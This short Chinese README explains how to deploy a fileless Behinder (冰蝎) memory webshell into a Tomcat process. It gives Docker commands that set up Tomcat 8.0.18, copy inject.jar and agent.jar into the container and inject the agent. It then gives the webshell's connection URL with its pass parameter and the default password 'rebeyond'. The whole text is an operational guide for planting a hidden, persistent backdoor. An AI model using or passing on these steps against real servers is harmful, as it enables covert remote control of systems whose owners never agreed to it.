# Tomcat 无文件冰蝎内存马
## 使用以下命令创建tomcat容器，并将inject.jar,agent.jar复制到容器中。
    docker run -d -ti --net host --name tomcat  tomcat:8.0.18-jre8
    docker cp inject.jar tomcat:/usr/local/tomcat
    docker cp agent.jar  tomcat:/usr/local/tomcat
    
## 使用以下命令将其注入到tomcat进程中。
    java -jar inject.jar 123

## 通过behinder.jar连接内存冰蝎马，url格式：
    http://ip:port/1.jsp?pass_the_world=123&model=chopper
    
## 密码:
    rebeyond
